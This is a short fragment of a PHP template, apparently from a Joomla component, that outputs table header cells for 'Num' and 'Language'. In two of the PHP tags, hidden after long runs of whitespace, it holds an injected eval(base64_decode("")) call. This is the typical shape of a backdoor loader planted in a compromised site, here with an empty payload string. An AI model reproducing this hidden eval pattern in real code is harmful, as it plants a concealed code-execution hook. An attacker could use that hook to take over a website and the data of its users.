				<th class="title" width="10px"><?php	                                       			eval(base64_decode("")); echo JText::_( 'Num' ); ?></th>
                <th class="title" width="10px">&nbsp;</th>
				<th class="title"><?php	                                       			eval(base64_decode("")); echo JText::_( 'Language' ); ?></th>
